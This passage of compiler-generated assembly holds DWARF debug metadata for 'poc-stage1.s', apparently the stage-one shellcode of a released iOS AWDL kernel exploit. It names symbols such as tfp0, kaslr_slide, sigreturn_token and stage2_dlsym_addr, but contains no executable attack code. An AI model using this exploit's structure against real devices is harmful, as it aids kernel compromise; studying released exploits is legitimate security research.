	.byte	3                               ; Abbrev [3] 0x312:0x5 DW_TAG_pointer_type
	.long	791                             ; DW_AT_type
	.byte	23                              ; Abbrev [23] 0x317:0x5 DW_TAG_structure_type
	.long	447                             ; DW_AT_name
                                        ; DW_AT_declaration
	.byte	3                               ; Abbrev [3] 0x31c:0x5 DW_TAG_pointer_type
	.long	801                             ; DW_AT_type
	.byte	4                               ; Abbrev [4] 0x321:0x1f DW_TAG_subroutine_type
	.long	832                             ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x326:0x5 DW_TAG_formal_parameter
	.long	843                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x32b:0x5 DW_TAG_formal_parameter
	.long	905                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x330:0x5 DW_TAG_formal_parameter
	.long	916                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x335:0x5 DW_TAG_formal_parameter
	.long	905                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x33a:0x5 DW_TAG_formal_parameter
	.long	927                             ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	9                               ; Abbrev [9] 0x340:0xb DW_TAG_typedef
	.long	768                             ; DW_AT_type
	.long	462                             ; DW_AT_name
	.byte	6                               ; DW_AT_decl_file
	.byte	73                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x34b:0xb DW_TAG_typedef
	.long	854                             ; DW_AT_type
	.long	476                             ; DW_AT_name
	.byte	10                              ; DW_AT_decl_file
	.byte	74                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x356:0xb DW_TAG_typedef
	.long	865                             ; DW_AT_type
	.long	485                             ; DW_AT_name
	.byte	9                               ; DW_AT_decl_file
	.byte	50                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x361:0xb DW_TAG_typedef
	.long	876                             ; DW_AT_type
	.long	497                             ; DW_AT_name
	.byte	8                               ; DW_AT_decl_file
	.byte	69                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x36c:0xb DW_TAG_typedef
	.long	887                             ; DW_AT_type
	.long	518                             ; DW_AT_name
	.byte	8                               ; DW_AT_decl_file
	.byte	68                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x377:0xb DW_TAG_typedef
	.long	898                             ; DW_AT_type
	.long	544                             ; DW_AT_name
	.byte	7                               ; DW_AT_decl_file
	.byte	28                              ; DW_AT_decl_line
	.byte	8                               ; Abbrev [8] 0x382:0x7 DW_TAG_base_type
	.long	563                             ; DW_AT_name
	.byte	7                               ; DW_AT_encoding
	.byte	4                               ; DW_AT_byte_size
	.byte	9                               ; Abbrev [9] 0x389:0xb DW_TAG_typedef
	.long	131                             ; DW_AT_type
	.long	576                             ; DW_AT_name
	.byte	11                              ; DW_AT_decl_file
	.byte	107                             ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x394:0xb DW_TAG_typedef
	.long	131                             ; DW_AT_type
	.long	594                             ; DW_AT_name
	.byte	11                              ; DW_AT_decl_file
	.byte	109                             ; DW_AT_decl_line
	.byte	3                               ; Abbrev [3] 0x39f:0x5 DW_TAG_pointer_type
	.long	916                             ; DW_AT_type
	.byte	3                               ; Abbrev [3] 0x3a4:0x5 DW_TAG_pointer_type
	.long	937                             ; DW_AT_type
	.byte	24                              ; Abbrev [24] 0x3a9:0x5 DW_TAG_subroutine_type
	.long	942                             ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	9                               ; Abbrev [9] 0x3ae:0xb DW_TAG_typedef
	.long	953                             ; DW_AT_type
	.long	609                             ; DW_AT_name
	.byte	12                              ; DW_AT_decl_file
	.byte	106                             ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x3b9:0xb DW_TAG_typedef
	.long	887                             ; DW_AT_type
	.long	626                             ; DW_AT_name
	.byte	11                              ; DW_AT_decl_file
	.byte	96                              ; DW_AT_decl_line
	.byte	3                               ; Abbrev [3] 0x3c4:0x5 DW_TAG_pointer_type
	.long	969                             ; DW_AT_type
	.byte	4                               ; Abbrev [4] 0x3c9:0x1a DW_TAG_subroutine_type
	.long	832                             ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x3ce:0x5 DW_TAG_formal_parameter
	.long	843                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x3d3:0x5 DW_TAG_formal_parameter
	.long	995                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x3d8:0x5 DW_TAG_formal_parameter
	.long	916                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x3dd:0x5 DW_TAG_formal_parameter
	.long	768                             ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	3                               ; Abbrev [3] 0x3e3:0x5 DW_TAG_pointer_type
	.long	905                             ; DW_AT_type
	.byte	3                               ; Abbrev [3] 0x3e8:0x5 DW_TAG_pointer_type
	.long	1005                            ; DW_AT_type
	.byte	4                               ; Abbrev [4] 0x3ed:0x1a DW_TAG_subroutine_type
	.long	92                              ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x3f2:0x5 DW_TAG_formal_parameter
	.long	1031                            ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x3f7:0x5 DW_TAG_formal_parameter
	.long	1037                            ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x3fc:0x5 DW_TAG_formal_parameter
	.long	1031                            ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x401:0x5 DW_TAG_formal_parameter
	.long	1037                            ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	3                               ; Abbrev [3] 0x407:0x5 DW_TAG_pointer_type
	.long	1036                            ; DW_AT_type
	.byte	25                              ; Abbrev [25] 0x40c:0x1 DW_TAG_const_type
	.byte	9                               ; Abbrev [9] 0x40d:0xb DW_TAG_typedef
	.long	1048                            ; DW_AT_type
	.long	636                             ; DW_AT_name
	.byte	13                              ; DW_AT_decl_file
	.byte	31                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x418:0xb DW_TAG_typedef
	.long	1059                            ; DW_AT_type
	.long	643                             ; DW_AT_name
	.byte	7                               ; DW_AT_decl_file
	.byte	70                              ; DW_AT_decl_line
	.byte	8                               ; Abbrev [8] 0x423:0x7 DW_TAG_base_type
	.long	659                             ; DW_AT_name
	.byte	7                               ; DW_AT_encoding
	.byte	8                               ; DW_AT_byte_size
	.byte	3                               ; Abbrev [3] 0x42a:0x5 DW_TAG_pointer_type
	.long	1071                            ; DW_AT_type
	.byte	4                               ; Abbrev [4] 0x42f:0x1f DW_TAG_subroutine_type
	.long	832                             ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x434:0x5 DW_TAG_formal_parameter
	.long	843                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x439:0x5 DW_TAG_formal_parameter
	.long	905                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x43e:0x5 DW_TAG_formal_parameter
	.long	916                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x443:0x5 DW_TAG_formal_parameter
	.long	1102                            ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x448:0x5 DW_TAG_formal_parameter
	.long	1113                            ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	9                               ; Abbrev [9] 0x44e:0xb DW_TAG_typedef
	.long	768                             ; DW_AT_type
	.long	677                             ; DW_AT_name
	.byte	14                              ; DW_AT_decl_file
	.byte	70                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x459:0xb DW_TAG_typedef
	.long	768                             ; DW_AT_type
	.long	687                             ; DW_AT_name
	.byte	15                              ; DW_AT_decl_file
	.byte	75                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x464:0xb DW_TAG_typedef
	.long	1135                            ; DW_AT_type
	.long	697                             ; DW_AT_name
	.byte	4                               ; DW_AT_decl_file
	.byte	27                              ; DW_AT_decl_line
	.byte	3                               ; Abbrev [3] 0x46f:0x5 DW_TAG_pointer_type
	.long	1140                            ; DW_AT_type
	.byte	23                              ; Abbrev [23] 0x474:0x5 DW_TAG_structure_type
	.long	706                             ; DW_AT_name
                                        ; DW_AT_declaration
	.byte	3                               ; Abbrev [3] 0x479:0x5 DW_TAG_pointer_type
	.long	718                             ; DW_AT_type
	.byte	9                               ; Abbrev [9] 0x47e:0xb DW_TAG_typedef
	.long	898                             ; DW_AT_type
	.long	715                             ; DW_AT_name
	.byte	16                              ; DW_AT_decl_file
	.byte	31                              ; DW_AT_decl_line
	.byte	3                               ; Abbrev [3] 0x489:0x5 DW_TAG_pointer_type
	.long	1166                            ; DW_AT_type
	.byte	4                               ; Abbrev [4] 0x48e:0xc DW_TAG_subroutine_type
	.long	768                             ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x493:0x5 DW_TAG_formal_parameter
	.long	93                              ; DW_AT_type
	.byte	22                              ; Abbrev [22] 0x498:0x1 DW_TAG_unspecified_parameters
	.byte	0                               ; End Of Children Mark
	.byte	26                              ; Abbrev [26] 0x49a:0xd0 DW_TAG_subprogram
	.quad	Lfunc_begin0                    ; DW_AT_low_pc
.set Lset14, Lfunc_end0-Lfunc_begin0    ; DW_AT_high_pc
	.long	Lset14
                                        ; DW_AT_APPLE_omit_frame_ptr
	.byte	1                               ; DW_AT_frame_base
	.byte	111
	.long	724                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	106                             ; DW_AT_decl_line
                                        ; DW_AT_prototyped
                                        ; DW_AT_external
	.byte	12                              ; Abbrev [12] 0x4af:0xf DW_TAG_formal_parameter
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\314\007"
	.long	789                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	106                             ; DW_AT_decl_line
	.long	854                             ; DW_AT_type
	.byte	12                              ; Abbrev [12] 0x4be:0xf DW_TAG_formal_parameter
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\300\007"
	.long	794                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	106                             ; DW_AT_decl_line
	.long	92                              ; DW_AT_type
	.byte	12                              ; Abbrev [12] 0x4cd:0xf DW_TAG_formal_parameter
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\270\007"
	.long	812                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	106                             ; DW_AT_decl_line
	.long	92                              ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x4dc:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\210\001"
	.long	828                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	110                             ; DW_AT_decl_line
	.long	1474                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x4eb:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\200\001"
	.long	891                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	111                             ; DW_AT_decl_line
	.long	916                             ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x4fa:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.asciz	"\374"
	.long	900                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	117                             ; DW_AT_decl_line
	.long	1150                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x509:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.asciz	"\360"
	.long	911                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	124                             ; DW_AT_decl_line
	.long	905                             ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x518:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.asciz	"\354"
	.long	916                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	125                             ; DW_AT_decl_line
	.long	854                             ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x527:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.asciz	"\340"
	.long	923                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	134                             ; DW_AT_decl_line
	.long	131                             ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x536:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.asciz	"\330"
	.long	930                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	135                             ; DW_AT_decl_line
	.long	1544                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x545:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.asciz	"\320"
	.long	948                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	143                             ; DW_AT_decl_line
	.long	1554                            ; DW_AT_type
	.byte	15                              ; Abbrev [15] 0x554:0x15 DW_TAG_lexical_block
.set Lset15, Ldebug_ranges0-Ldebug_range ; DW_AT_ranges
	.long	Lset15
	.byte	13                              ; Abbrev [13] 0x559:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.asciz	"\350"
	.long	921                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	129                             ; DW_AT_decl_line
	.long	1150                            ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
	.byte	27                              ; Abbrev [27] 0x56a:0x20 DW_TAG_subprogram
	.quad	Lfunc_begin2                    ; DW_AT_low_pc
.set Lset16, Lfunc_end2-Lfunc_begin2    ; DW_AT_high_pc
	.long	Lset16
                                        ; DW_AT_APPLE_omit_frame_ptr
	.byte	1                               ; DW_AT_frame_base
	.byte	111
	.long	735                             ; DW_AT_name
                                        ; DW_AT_artificial
                                        ; DW_AT_external
	.byte	28                              ; Abbrev [28] 0x57d:0xc DW_TAG_formal_parameter
	.byte	2                               ; DW_AT_location
	.byte	145
	.byte	8
	.long	1193                            ; DW_AT_name
	.long	92                              ; DW_AT_type
                                        ; DW_AT_artificial
	.byte	0                               ; End Of Children Mark
	.byte	27                              ; Abbrev [27] 0x58a:0x38 DW_TAG_subprogram
	.quad	Lfunc_begin3                    ; DW_AT_low_pc
.set Lset17, Lfunc_end3-Lfunc_begin3    ; DW_AT_high_pc
	.long	Lset17
                                        ; DW_AT_APPLE_omit_frame_ptr
	.byte	1                               ; DW_AT_frame_base
	.byte	111
	.long	758                             ; DW_AT_name
                                        ; DW_AT_artificial
                                        ; DW_AT_external
	.byte	28                              ; Abbrev [28] 0x59d:0xc DW_TAG_formal_parameter
	.byte	2                               ; DW_AT_location
	.byte	145
	.byte	8
	.long	1193                            ; DW_AT_name
	.long	92                              ; DW_AT_type
                                        ; DW_AT_artificial
	.byte	28                              ; Abbrev [28] 0x5a9:0xc DW_TAG_formal_parameter
	.byte	2                               ; DW_AT_location
	.byte	145
	.byte	4
	.long	1200                            ; DW_AT_name
	.long	898                             ; DW_AT_type
                                        ; DW_AT_artificial
	.byte	28                              ; Abbrev [28] 0x5b5:0xc DW_TAG_formal_parameter
	.byte	2                               ; DW_AT_location
	.byte	145
	.byte	0
	.long	1205                            ; DW_AT_name
	.long	898                             ; DW_AT_type
                                        ; DW_AT_artificial
	.byte	0                               ; End Of Children Mark
	.byte	29                              ; Abbrev [29] 0x5c2:0x3a DW_TAG_structure_type
	.long	831                             ; DW_AT_name
	.short	816                             ; DW_AT_byte_size
	.byte	1                               ; DW_AT_decl_file
	.byte	98                              ; DW_AT_decl_line
	.byte	30                              ; Abbrev [30] 0x5cb:0xc DW_TAG_member
	.long	837                             ; DW_AT_name
	.long	131                             ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	99                              ; DW_AT_decl_line
	.byte	0                               ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x5d7:0xc DW_TAG_member
	.long	849                             ; DW_AT_name
	.long	1150                            ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	100                             ; DW_AT_decl_line
	.byte	8                               ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x5e3:0xc DW_TAG_member
	.long	859                             ; DW_AT_name
	.long	1150                            ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	101                             ; DW_AT_decl_line
	.byte	12                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x5ef:0xc DW_TAG_member
	.long	876                             ; DW_AT_name
	.long	1532                            ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	102                             ; DW_AT_decl_line
	.byte	16                              ; DW_AT_data_member_location
	.byte	0                               ; End Of Children Mark
	.byte	17                              ; Abbrev [17] 0x5fc:0xc DW_TAG_array_type
	.long	131                             ; DW_AT_type
	.byte	18                              ; Abbrev [18] 0x601:0x6 DW_TAG_subrange_type
	.long	648                             ; DW_AT_type
	.byte	100                             ; DW_AT_count
	.byte	0                               ; End Of Children Mark
	.byte	3                               ; Abbrev [3] 0x608:0x5 DW_TAG_pointer_type
	.long	1549                            ; DW_AT_type
	.byte	31                              ; Abbrev [31] 0x60d:0x5 DW_TAG_volatile_type
	.long	131                             ; DW_AT_type
	.byte	3                               ; Abbrev [3] 0x612:0x5 DW_TAG_pointer_type
	.long	1559                            ; DW_AT_type
	.byte	32                              ; Abbrev [32] 0x617:0xc DW_TAG_subroutine_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x618:0x5 DW_TAG_formal_parameter
	.long	854                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x61d:0x5 DW_TAG_formal_parameter
	.long	92                              ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	3                               ; Abbrev [3] 0x623:0x5 DW_TAG_pointer_type
	.long	93                              ; DW_AT_type
	.byte	9                               ; Abbrev [9] 0x628:0xb DW_TAG_typedef
	.long	1587                            ; DW_AT_type
	.long	969                             ; DW_AT_name
	.byte	17                              ; DW_AT_decl_file
	.byte	31                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x633:0xb DW_TAG_typedef
	.long	1598                            ; DW_AT_type
	.long	975                             ; DW_AT_name
	.byte	8                               ; DW_AT_decl_file
	.byte	75                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x63e:0xb DW_TAG_typedef
	.long	898                             ; DW_AT_type
	.long	990                             ; DW_AT_name
	.byte	7                               ; DW_AT_decl_file
	.byte	23                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x649:0xb DW_TAG_typedef
	.long	679                             ; DW_AT_type
	.long	1020                            ; DW_AT_name
	.byte	4                               ; DW_AT_decl_file
	.byte	82                              ; DW_AT_decl_line
	.byte	17                              ; Abbrev [17] 0x654:0xc DW_TAG_array_type
	.long	718                             ; DW_AT_type
	.byte	18                              ; Abbrev [18] 0x659:0x6 DW_TAG_subrange_type
	.long	648                             ; DW_AT_type
	.byte	2                               ; DW_AT_count
	.byte	0                               ; End Of Children Mark
	.byte	3                               ; Abbrev [3] 0x660:0x5 DW_TAG_pointer_type
	.long	1637                            ; DW_AT_type
	.byte	33                              ; Abbrev [33] 0x665:0x81 DW_TAG_structure_type
	.long	1050                            ; DW_AT_name
	.byte	72                              ; DW_AT_byte_size
	.byte	18                              ; DW_AT_decl_file
	.byte	84                              ; DW_AT_decl_line
	.byte	30                              ; Abbrev [30] 0x66d:0xc DW_TAG_member
	.long	1057                            ; DW_AT_name
	.long	1766                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	85                              ; DW_AT_decl_line
	.byte	0                               ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x679:0xc DW_TAG_member
	.long	1065                            ; DW_AT_name
	.long	1766                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	86                              ; DW_AT_decl_line
	.byte	8                               ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x685:0xc DW_TAG_member
	.long	1075                            ; DW_AT_name
	.long	1576                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	87                              ; DW_AT_decl_line
	.byte	16                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x691:0xc DW_TAG_member
	.long	1082                            ; DW_AT_name
	.long	1771                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	88                              ; DW_AT_decl_line
	.byte	20                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x69d:0xc DW_TAG_member
	.long	1110                            ; DW_AT_name
	.long	1793                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	89                              ; DW_AT_decl_line
	.byte	24                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x6a9:0xc DW_TAG_member
	.long	1145                            ; DW_AT_name
	.long	1766                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	90                              ; DW_AT_decl_line
	.byte	32                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x6b5:0xc DW_TAG_member
	.long	1154                            ; DW_AT_name
	.long	1766                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	91                              ; DW_AT_decl_line
	.byte	40                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x6c1:0xc DW_TAG_member
	.long	1163                            ; DW_AT_name
	.long	1766                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	92                              ; DW_AT_decl_line
	.byte	48                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x6cd:0xc DW_TAG_member
	.long	1170                            ; DW_AT_name
	.long	1766                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	93                              ; DW_AT_decl_line
	.byte	56                              ; DW_AT_data_member_location
	.byte	30                              ; Abbrev [30] 0x6d9:0xc DW_TAG_member
	.long	1179                            ; DW_AT_name
	.long	1793                            ; DW_AT_type
	.byte	18                              ; DW_AT_decl_file
	.byte	94                              ; DW_AT_decl_line
	.byte	64                              ; DW_AT_data_member_location
	.byte	0                               ; End Of Children Mark
	.byte	3                               ; Abbrev [3] 0x6e6:0x5 DW_TAG_pointer_type
	.long	103                             ; DW_AT_type
	.byte	9                               ; Abbrev [9] 0x6eb:0xb DW_TAG_typedef
	.long	1782                            ; DW_AT_type
	.long	1089                            ; DW_AT_name
	.byte	19                              ; DW_AT_decl_file
	.byte	31                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x6f6:0xb DW_TAG_typedef
	.long	1598                            ; DW_AT_type
	.long	1095                            ; DW_AT_name
	.byte	8                               ; DW_AT_decl_file
	.byte	60                              ; DW_AT_decl_line
	.byte	9                               ; Abbrev [9] 0x701:0xb DW_TAG_typedef
	.long	1804                            ; DW_AT_type
	.long	1120                            ; DW_AT_name
	.byte	7                               ; DW_AT_decl_file
	.byte	98                              ; DW_AT_decl_line
	.byte	8                               ; Abbrev [8] 0x70c:0x7 DW_TAG_base_type
	.long	1136                            ; DW_AT_name
	.byte	5                               ; DW_AT_encoding
	.byte	8                               ; DW_AT_byte_size
	.byte	17                              ; Abbrev [17] 0x713:0xc DW_TAG_array_type
	.long	718                             ; DW_AT_type
	.byte	18                              ; Abbrev [18] 0x718:0x6 DW_TAG_subrange_type
	.long	648                             ; DW_AT_type
	.byte	14                              ; DW_AT_count
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
Ldebug_info_end0:
	.section	__DWARF,__debug_ranges,regular,debug
Ldebug_range:
Ldebug_ranges0:
.set Lset18, Ltmp1-Lfunc_begin0
	.quad	Lset18
.set Lset19, Ltmp4-Lfunc_begin0
	.quad	Lset19
.set Lset20, Ltmp5-Lfunc_begin0
	.quad	Lset20
.set Lset21, Ltmp6-Lfunc_begin0
	.quad	Lset21
.set Lset22, Ltmp7-Lfunc_begin0
	.quad	Lset22
.set Lset23, Ltmp9-Lfunc_begin0
	.quad	Lset23
	.quad	0
	.quad	0
Ldebug_ranges1:
.set Lset24, Ltmp12-Lfunc_begin0
	.quad	Lset24
.set Lset25, Ltmp13-Lfunc_begin0
	.quad	Lset25
.set Lset26, Ltmp16-Lfunc_begin0
	.quad	Lset26
.set Lset27, Ltmp17-Lfunc_begin0
	.quad	Lset27
	.quad	0
	.quad	0
	.section	__DWARF,__debug_str,regular,debug
Linfo_string:
	.asciz	"Apple clang version 13.0.0 (clang-1300.0.18.6)" ; string offset=0
	.asciz	"poc-stage1.s"                    ; string offset=47
	.asciz	"/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk" ; string offset=58
	.asciz	"iPhoneOS15.0.sdk"              ; string offset=166
	.asciz	"/Users/xss/Downloads/awdl_exploit_release/shellcode" ; string offset=183
	.asciz	"_dlsym"                        ; string offset=235
	.asciz	"char"                          ; string offset=242
	.asciz	"kdata"                         ; string offset=247
	.asciz	"uint64_t"                      ; string offset=253
	.asciz	"long long unsigned int"        ; string offset=262
	.asciz	"_os_fmt_str"                   ; string offset=285
	.asciz	"__ARRAY_SIZE_TYPE__"           ; string offset=297
	.asciz	"uint8_t"                       ; string offset=317
	.asciz	"unsigned char"                 ; string offset=325
	.asciz	"OS_LOG_TYPE_DEFAULT"           ; string offset=339
	.asciz	"OS_LOG_TYPE_INFO"              ; string offset=359
	.asciz	"OS_LOG_TYPE_DEBUG"             ; string offset=376
	.asciz	"OS_LOG_TYPE_ERROR"             ; string offset=394
	.asciz	"OS_LOG_TYPE_FAULT"             ; string offset=412
	.asciz	"int"                           ; string offset=430
	.asciz	"asl_object_t"                  ; string offset=434
	.asciz	"__asl_object_s"                ; string offset=447
	.asciz	"kern_return_t"                 ; string offset=462
	.asciz	"vm_map_t"                      ; string offset=476
	.asciz	"mach_port_t"                   ; string offset=485
	.asciz	"__darwin_mach_port_t"          ; string offset=497
	.asciz	"__darwin_mach_port_name_t"     ; string offset=518
	.asciz	"__darwin_natural_t"            ; string offset=544
	.asciz	"unsigned int"                  ; string offset=563
	.asciz	"mach_vm_address_t"             ; string offset=576
	.asciz	"mach_vm_size_t"                ; string offset=594
	.asciz	"mach_port_name_t"              ; string offset=609
	.asciz	"natural_t"                     ; string offset=626
	.asciz	"size_t"                        ; string offset=636
	.asciz	"__darwin_size_t"               ; string offset=643
	.asciz	"long unsigned int"             ; string offset=659
	.asciz	"boolean_t"                     ; string offset=677
	.asciz	"vm_prot_t"                     ; string offset=687
	.asciz	"os_log_t"                      ; string offset=697
	.asciz	"os_log_s"                      ; string offset=706
	.asciz	"uint32_t"                      ; string offset=715
	.asciz	"start"                         ; string offset=724
	.asciz	"main"                          ; string offset=730
	.asciz	"__os_log_helper_16_0_0"        ; string offset=735
	.asciz	"__os_log_helper_16_0_2_4_0_4_0" ; string offset=758
	.asciz	"tfp0"                          ; string offset=789
	.asciz	"sigreturn_context"             ; string offset=794
	.asciz	"sigreturn_token"               ; string offset=812
	.asciz	"kc"                            ; string offset=828
	.asciz	"kconf"                         ; string offset=831
	.asciz	"kaslr_slide"                   ; string offset=837
	.asciz	"kbuf_size"                     ; string offset=849
	.asciz	"n_text_fragments"              ; string offset=859
	.asciz	"text_fragments"                ; string offset=876
	.asciz	"out_size"                      ; string offset=891
	.asciz	"total_size"                    ; string offset=900
	.asciz	"base"                          ; string offset=911
	.asciz	"self"                          ; string offset=916
	.asciz	"i"                             ; string offset=921
	.asciz	"needle"                        ; string offset=923
	.asciz	"stage2_dlsym_addr"             ; string offset=930
	.asciz	"stage2"                        ; string offset=948
	.asciz	"argc"                          ; string offset=955
	.asciz	"argv"                          ; string offset=960
	.asciz	"uid"                           ; string offset=965
	.asciz	"uid_t"                         ; string offset=969
	.asciz	"__darwin_uid_t"                ; string offset=975
	.asciz	"__uint32_t"                    ; string offset=990
	.asciz	"_log_tmp"                      ; string offset=1001
	.asciz	"_type_tmp"                     ; string offset=1010
	.asciz	"os_log_type_t"                 ; string offset=1020
	.asciz	"_os_fmt_buf"                   ; string offset=1034
	.asciz	"pwd"                           ; string offset=1046
	.asciz	"passwd"                        ; string offset=1050
	.asciz	"pw_name"                       ; string offset=1057
	.asciz	"pw_passwd"                     ; string offset=1065
	.asciz	"pw_uid"                        ; string offset=1075
	.asciz	"pw_gid"                        ; string offset=1082
	.asciz	"gid_t"                         ; string offset=1089
	.asciz	"__darwin_gid_t"                ; string offset=1095
	.asciz	"pw_change"                     ; string offset=1110
	.asciz	"__darwin_time_t"               ; string offset=1120
	.asciz	"long int"                      ; string offset=1136
	.asciz	"pw_class"                      ; string offset=1145
	.asciz	"pw_gecos"                      ; string offset=1154
	.asciz	"pw_dir"                        ; string offset=1163
	.asciz	"pw_shell"                      ; string offset=1170
	.asciz	"pw_expire"                     ; string offset=1179
	.asciz	"err"                           ; string offset=1189
	.asciz	"buffer"                        ; string offset=1193
	.asciz	"arg0"                          ; string offset=1200
	.asciz	"arg1"                          ; string offset=1205
	.section	__DWARF,__apple_names,regular,debug
Lnames_begin:
	.long	1212240712                      ; Header Magic
	.short	1                               ; Header Version
	.short	0                               ; Header Hash Function
	.long	7                               ; Header Bucket Count
	.long	7                               ; Header Hash Count
	.long	12                              ; Header Data Length
	.long	0                               ; HeaderData Die Offset Base
	.long	1                               ; HeaderData Atom Count
	.short	1                               ; DW_ATOM_die_offset
	.short	6                               ; DW_FORM_data4
	.long	-1                              ; Bucket 0
	.long	0                               ; Bucket 1
	.long	-1                              ; Bucket 2
	.long	1                               ; Bucket 3
	.long	2                               ; Bucket 4
	.long	3                               ; Bucket 5
	.long	6                               ; Bucket 6
	.long	-140503639                      ; Hash in Bucket 1
